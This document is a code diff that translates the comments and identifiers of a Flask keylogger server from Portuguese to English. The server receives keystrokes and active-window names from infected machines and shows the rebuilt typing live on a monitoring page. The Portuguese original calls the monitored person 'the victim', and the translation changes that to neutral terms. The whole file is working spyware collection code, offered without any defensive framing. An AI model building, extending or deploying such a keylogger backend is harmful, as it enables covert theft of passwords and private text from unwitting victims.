@@ -1,88 +1,88 @@
-from flask import Flask, request, render_template_string, jsonify  # Importa o Flask para criar o servidor web e manipular requisições
+from flask import Flask, request, render_template_string, jsonify  # Import Flask to create the web server and handle requests
 
-app = Flask(__name__)  # Inicializa a aplicação Flask
+app = Flask(__name__)  # Initialize the Flask application
 
-# Variáveis globais para armazenar as teclas pressionadas e a janela ativa
-log_teclas = ""  # String para armazenar o log de teclas
-janela_atual = "Desconhecido"  # Armazena o nome da janela ativa
+# Global variables to store pressed keys and the active window
+key_log = ""  # String to store the key log
+current_window = "Unknown"  # Stores the name of the active window
 
-# Template HTML para exibir os logs de teclas e a janela ativa no navegador
+# HTML template to display the key logs and active window in the browser
 html_template = """
 <!DOCTYPE html>
-<html lang="pt">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <title>Keylogger</title>
     <style>
         body { font-family: Arial, sans-serif; padding: 20px; }
         #log { white-space: pre-wrap; background: #f4f4f4; padding: 10px; border-radius: 5px; }
-        #janela { font-weight: bold; color: red; }
+        #window { font-weight: bold; color: red; }
     </style>
     <script>
-        function atualizarLog() {
-            fetch('/ver')
+        function updateLog() {
+            fetch('/view')
                 .then(response => response.text())
                 .then(data => { document.getElementById('log').innerText = data; });
         }
-        function atualizarJanela() {
-            fetch('/janela')
+        function updateWindow() {
+            fetch('/window')
                 .then(response => response.text())
-                .then(data => { document.getElementById('janela').innerText = data; });
+                .then(data => { document.getElementById('window').innerText = data; });
         }
-        setInterval(atualizarLog, 1000);
-        setInterval(atualizarJanela, 1000);
+        setInterval(updateLog, 1000);
+        setInterval(updateWindow, 1000);
     </script>
 </head>
 <body>
-    <h1>Monitoramento de Teclas</h1>
-    <p>Aplicação ou site ativo: <span id="janela"></span></p>
-    <div id="log">Aguardando teclas...</div>
+    <h1>Key Monitoring</h1>
+    <p>Active application or site: <span id="window"></span></p>
+    <div id="log">Waiting for keys...</div>
 </body>
 </html>
 """
 
 @app.route("/")
 def index():
-    """Rota principal que renderiza o template HTML."""
+    """Main route that renders the HTML template."""
     return render_template_string(html_template)
 
 @app.route("/log", methods=["POST"])
-def receber_tecla():
-    """Rota para receber dados de teclas pressionadas enviados pela vítima."""
-    global log_teclas, janela_atual
+def receive_key():
+    """Route to receive key press data sent by the client."""
+    global key_log, current_window
     try:
-        data = request.json  # Obtém os dados da requisição POST no formato JSON
-        tecla = data.get("tecla", "")  # Obtém a tecla pressionada
-        janela = data.get("janela", "Desconhecido")  # Obtém a janela ativa
+        data = request.json  # Get the POST request data in JSON format
+        key = data.get("key", "")  # Get the pressed key
+        window = data.get("window", "Unknown")  # Get the active window
 
-        # Verifica se houve mudança de janela
-        if janela != janela_atual:
-            log_teclas += f"\n\n🔴 [A vítima mudou para: {janela}]\n"
-            janela_atual = janela
+        # Check if the window has changed
+        if window != current_window:
+            key_log += f"\n\n🔴 [The user switched to: {window}]\n"
+            current_window = window
 
-        # Registra a tecla pressionada no log de teclas
-        if tecla == "\b":  # Se a tecla for backspace
-            log_teclas = log_teclas[:-1]  # Remove o último caractere do log
+        # Log the pressed key
+        if key == "\b":  # If the key is backspace
+            key_log = key_log[:-1]  # Remove the last character from the log
         else:
-            log_teclas += tecla  # Adiciona a tecla ao log
+            key_log += key  # Add the key to the log
 
-        print(f"Tecla recebida: {tecla}")
+        print(f"Key received: {key}")
 
-        return jsonify({"status": "success", "message": "Tecla registrada"}), 200  # Retorna uma resposta de sucesso
+        return jsonify({"status": "success", "message": "Key logged"}), 200  # Return a success response
 
     except Exception as e:
-        print(f"Erro ao registrar tecla: {e}")
-        return jsonify({"status": "error", "message": str(e)}), 500  # Retorna uma resposta de erro
+        print(f"Error logging key: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500  # Return an error response
 
-@app.route("/ver")
-def ver_log():
-    """Rota para visualizar o log de teclas."""
-    return log_teclas
+@app.route("/view")
+def view_log():
+    """Route to view the key log."""
+    return key_log
 
-@app.route("/janela")
-def ver_janela():
-    """Rota para visualizar a janela ativa."""
-    return janela_atual
+@app.route("/window")
+def view_window():
+    """Route to view the active window."""
+    return current_window
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000, debug=True)  # Inicia o servidor Flask para rodar localmente na porta 5000
+    app.run(host="0.0.0.0", port=5000, debug=True)  # Start the Flask server to run locally on port 5000
